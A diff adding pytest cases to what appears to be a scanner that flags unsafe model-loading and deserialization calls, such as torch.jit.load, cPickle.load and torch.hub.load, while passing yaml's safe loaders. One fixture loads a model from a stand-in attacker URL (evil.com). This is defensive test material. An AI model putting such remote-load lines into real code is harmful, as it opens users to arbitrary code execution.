@@ -227,6 +227,107 @@ def test_baseline_filtering():
         assert len(filtered) < len(all_findings)
 
 
+def test_yaml_load_with_safe_loader_no_finding():
+    """yaml.load with Loader=yaml.SafeLoader should NOT be flagged."""
+    path = _write_temp('config = yaml.load(data, Loader=yaml.SafeLoader)')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert not any("yaml" in f.pattern for f in findings)
+
+
+def test_detects_torch_jit_load():
+    path = _write_temp('model = torch.jit.load("scripted_model.pt")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert len(findings) >= 1
+    assert any("torch.jit.load" in f.pattern for f in findings)
+
+
+def test_detects_safetensors_disabled():
+    path = _write_temp('model = AutoModel.from_pretrained("m", use_safetensors=False)')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("safetensors disabled" in f.pattern for f in findings)
+
+
+def test_detects_tf_saved_model():
+    path = _write_temp('model = tf.saved_model.load("/tmp/saved_model")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("tf.saved_model" in f.pattern for f in findings)
+
+
+def test_detects_torch_hub_load():
+    path = _write_temp('model = torch.hub.load("facebookresearch/pytorchvideo", "slow_r50")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("torch.hub.load" in f.pattern for f in findings)
+
+
+def test_detects_lightning_load_from_checkpoint():
+    path = _write_temp('model = MyModel.load_from_checkpoint("model.ckpt")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("lightning" in f.pattern for f in findings)
+
+
+def test_detects_accelerate_load_checkpoint():
+    path = _write_temp('model = load_checkpoint_and_dispatch(model, "checkpoint/")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("accelerate" in f.pattern for f in findings)
+
+
+def test_detects_cpickle_load():
+    path = _write_temp('import cPickle\ndata = cPickle.load(f)')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("cPickle" in f.pattern for f in findings)
+
+
+def test_yaml_csafe_loader_no_finding():
+    """yaml.load with Loader=yaml.CSafeLoader should NOT be flagged."""
+    path = _write_temp('config = yaml.load(data, Loader=yaml.CSafeLoader)')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert not any("yaml" in f.pattern for f in findings)
+
+
+def test_detects_paddle_load():
+    path = _write_temp('model = paddle.load("model.pdparams")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("paddle" in f.pattern for f in findings)
+
+
+def test_detects_mlflow_load():
+    path = _write_temp('model = mlflow.pytorch.load_model("runs:/abc123/model")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("mlflow" in f.pattern for f in findings)
+
+
+def test_detects_torch_load_from_url():
+    path = _write_temp('model = torch.load("https://evil.com/model.pt")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any(f.severity == "CRITICAL" for f in findings)
+
+
+def test_detects_model_zoo_load_url():
+    path = _write_temp('weights = torch.utils.model_zoo.load_url("https://example.com/m.pth")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert any("model_zoo" in f.pattern for f in findings)
+
+
+def test_skips_logging_lines():
+    path = _write_temp('logger.warning("torch.load called with weights_only=False")')
+    findings = scan_file(path)
+    os.unlink(path)
+    assert len(findings) == 0
+
+
 if __name__ == "__main__":
     import pytest
     pytest.main([__file__, "-v"])
